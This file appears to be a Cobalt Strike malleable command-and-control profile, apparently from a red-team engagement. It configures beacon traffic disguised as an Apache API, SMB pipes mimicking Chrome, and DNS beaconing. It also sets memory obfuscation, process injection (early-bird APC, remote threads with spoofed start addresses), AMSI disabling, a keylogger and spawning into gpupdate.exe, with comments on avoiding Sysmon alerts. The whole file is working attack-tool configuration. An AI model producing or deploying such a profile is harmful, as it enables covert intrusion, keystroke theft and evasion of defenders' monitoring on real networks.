set useragent "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136";

set host_stage "true";

http-stager {
    server {
        header "Cache-Control" "no-cache";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "Apache";
        header "Connection" "close";
    
    }
}

# HTTP GET
http-get {
	set uri "/api/v1/status";

	client {
		header "Cache-Control" "no-cache";
		header "Connection" "Keep-Alive";
		header "Pragma" "no-cache";

		metadata {
			mask;
			base64url;
			header "Cookie";
		}
	}

	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "Server" "Apache";

		output {
            mask;
            base64url;
			print;
		}
	}
}

# HTTP POST
http-post {
	set uri "/api/v1/entry";
    set verb "POST";

	client {
		header "Cache-Control" "no-cache";
		header "Connection" "Keep-Alive";
		header "Pragma" "no-cache";

		id {
            mask;
			base64url;
			append "RGVsb2l0dGUgQzIK";
            parameter "id";
		}

		output {
            mask;
            base64url;
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Content-Type" "application/octet-stream";
		header "Connection" "Keep-Alive";
		header "Server" "Apache";

		# this will just print an empty string, meh...
		output {
            mask;
            base64url;
			print;
		}
	}
}

# set spawnto_x86 "%windir\\syswow64\\w32tm.exe";
# set spawnto_x64 "%windir%\\sysnative\\w32tm.exe";

# SMB beacon settings

set pipename            "mojo.5688.8052.13978878347826753578###";
set pipename_stager     "mojo.5688.8052.84765857876403258375###";
# set smb_frame_header    "\x80";

# DNS settings

dns-beacon {
    set maxdns          "255";
    set dns_max_txt     "252";
    set dns_idle        "74.125.196.113";
}

stage {
    set checksum       "0";
    set compile_time   "25 Oct 2016 01:57:23";
    set entry_point    "170000";
    set userwx 	       "true";
    set cleanup	       "true";
    set sleep_mask	   "true";
    set stomppe	       "true";
    set obfuscate	   "true";
    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    
    #obfuscate beacon before sleep.
    set sleep_mask      "true";
    
    #https://www.cobaltstrike.com/releasenotes.txt -> + Added option to bootstrap Beacon in-memory without walking kernel32 EAT
    #set smartinject     "true";
    set smartinject	"true";

    #new 4.2. options   
    set allocator "HeapAlloc";
    set magic_mz_x64 "MZAR";
    set magic_pe "PE";
}

process-inject {

    #Can use NtMapViewOfSection or VirtualAllocEx
    #NtMapViewOfSection only allows same arch to same arch process injection.
    set allocator   "NtMapViewOfSection";		
    set min_alloc   "16700";
    set userwx      "false";  
    
    set startrwx    "true";
 
    #prepend has to be valid code for current arch       
    transform-x86 {
        prepend     "\x90\x90\x90";
    }
    transform-x64 {
        prepend     "\x90\x90\x90";
    }

    execute {
        #Options to spoof start address for CreateThread and CreateRemoteThread, +0x<nums> for offset added to start address. docs recommend ntdll and kernel32 using remote process.

        #start address does not point to the current process space, fires SYSMON 8 events
        #CreateThread;
        #CreateRemoteThread;       

        #self injection
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        #suspended process in post-ex jobs, takes over primary thread of temp process
        SetThreadContext;

        #early bird technique, creates a suspended process, queues an APC call to the process, resumes main thread to execute the APC.
        NtQueueApcThread-s;

        #uses an RWX stub, uses CreateThread with start address that stands out, same arch injection only.
        #NtQueueApcThread;

        #no cross session
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        #uses an RWX stub, fires SYSMON 8 events, does allow x86->x64 injection.
        #c2lint msg -> .process-inject.execute RtlCreateUserThread will cause unpredictable behavior with cross-session injects on XP/200
        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86     "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64     "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate       "true";
    set smartinject     "true";
    set amsi_disable    "true";
    
    #new 4.2 options
    set thread_hint     "ntdll.dll!RtlUserThreadStart";
    set pipename        "DserNamePipe##";
    set keylogger       "SetWindowsHookEx";
}
